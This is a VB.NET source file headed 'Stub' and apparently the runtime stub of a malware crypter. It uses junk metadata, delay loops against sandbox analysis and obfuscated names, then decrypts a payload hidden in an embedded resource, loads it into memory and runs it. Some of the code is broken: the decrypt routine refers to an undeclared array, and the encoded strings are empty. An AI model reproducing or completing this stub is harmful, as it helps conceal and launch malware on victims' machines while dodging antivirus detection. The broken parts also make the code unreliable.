Imports System
Imports System.Windows.Forms
Imports Microsoft.VisualBasic
Imports System.Reflection
Imports System.Reflection.Emit
Imports System.Diagnostics
Imports System.Text
Imports System.Drawing
Imports System.Collections
Imports System.Runtime.InteropServices

'-= Stub =-

'Option Explicit On
'Option Infer On
'Option Strict On

<Assembly: System.Reflection.AssemblyTitle("")> 
<Assembly: System.Reflection.AssemblyDescription("")> 
<Assembly: System.Reflection.AssemblyCompany("")> 
<Assembly: System.Reflection.AssemblyProduct("")> 
<Assembly: System.Reflection.AssemblyCopyright("")> 
<Assembly: System.Reflection.AssemblyTrademark("")> 
<Assembly: System.Runtime.InteropServices.ComVisible(True)> 
<Assembly: System.Runtime.InteropServices.GuidAttribute("5f4227a9-b771-4119-b36d-a6aa1d6f80ef")> 
<Assembly: System.Reflection.AssemblyVersion("1.0.0.0")> 
<Assembly: System.Reflection.AssemblyFileVersion("1.0.0.0")> 
<Assembly: System.Runtime.CompilerServices.CompilationRelaxations(3617)> 
<Assembly: System.Runtime.CompilerServices.RuntimeCompatibility(WrapNonExceptionThrows:=True)> 
<Assembly: System.Resources.SatelliteContractVersion("8733.3308.5509.9326")> 
<Assembly: System.Runtime.CompilerServices.DefaultDependency(System.Runtime.CompilerServices.LoadHint.Always)> 
<Assembly: System.Runtime.CompilerServices.StringFreezing()> 
<Assembly: System.Runtime.InteropServices.ComCompatibleVersion(6827, 2080, 2102, 9734)> 
<Assembly: System.Runtime.InteropServices.TypeLibVersion(9932, 1507)> 

#Region " Junk Form "
<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()> _
Partial Class fdwxujq


End Class
#End Region


Module fdwomru



    Sub Main()
        Try
            Dim fdwtufr As Reflection.AssemblyName() = System.Reflection.Assembly.GetExecutingAssembly().GetReferencedAssemblies()
            For Each qdzdzfdfregr As Reflection.AssemblyName In fdwtufr
                MsgBox(qdzdzfdfregr.FullName)
            Next

            System.Threading.Thread.Sleep(New System.Random().Next(1249, 2501))

            Dim fdwudhq = 0
            Dim fdwyrly As Long


            While fdwudhq < 10000000

                fdwyrly = (fdwudhq + 12123) Mod (fdwudhq + 5885)


                fdwudhq = fdwudhq + 1

            End While






            '%Binder%

            Dim fdwkjxn = System.AppDomain.CurrentDomain.Load(DeCrypt(System.Convert.FromBase64String(New System.Resources.ResourceManager(fdwdmhl(""), System.Reflection.Assembly.GetExecutingAssembly).GetObject(fdwdmhl(""))), fdwdmhl("")))
            Dim fdwxpqf = fdwkjxn.GetTypes(fdwdmhl(""))
            Dim fdwrxue = fdwxpqf.GetMethod(fdwdmhl(""))
            fdwrxue.Invoke(Nothing, New Object() {DeCrypt(System.Convert.FromBase64String(New System.Resources.ResourceManager(fdwdmhl(""), System.Reflection.Assembly.GetExecutingAssembly).GetObject(fdwdmhl(""))), fdwdmhl(""))})
        Catch fdwqouf As System.Exception


            System.Windows.Forms.MessageBox.Show(fdwdmhl("") & System.Environment.NewLine & fdwqouf.ToString, System.Windows.Forms.Application.ProductName & fdwdmhl(""), System.Windows.Forms.MessageBoxButtons.OK, System.Windows.Forms.MessageBoxIcon.Error)
        End Try



    End Sub



    Private Function fdwdmhl(ByVal fdwrion As String) As String

        For fdwldhh As Integer = 1 To Microsoft.VisualBasic.Len(fdwrion)
            While True
                Mid(fdwrion, fdwldhh, 1) = Microsoft.VisualBasic.ChrW(Microsoft.VisualBasic.AscW(Microsoft.VisualBasic.Strings.Mid(fdwrion, fdwldhh, 1)) - 63427)
                Exit While
            End While
        Next fdwldhh
        Return fdwrion
    End Function




    Public Shared Function DeCrypt(ByVal fdwwyzu As Byte, ByVal fdwiolf As String) As Byte()
        Dim fdwdnyl As Byte() = Encoding.Default.GetBytes(fdwiolf)
        For i = 0 To (FBcUIc0z1Z.Length * 2) + fdwdnyl.Length
            FBcUIc0z1Z(i Mod FBcUIc0z1Z.Length) = CByte(CInt((FBcUIc0z1Z(i Mod FBcUIc0z1Z.Length)) + CInt(FBcUIc0z1Z((i + 1) Mod FBcUIc0z1Z.Length))) Mod 256) Xor fdwdnyl(i Mod fdwdnyl.Length)
        Next
        Return FBcUIc0z1Z
    End Function


End Module

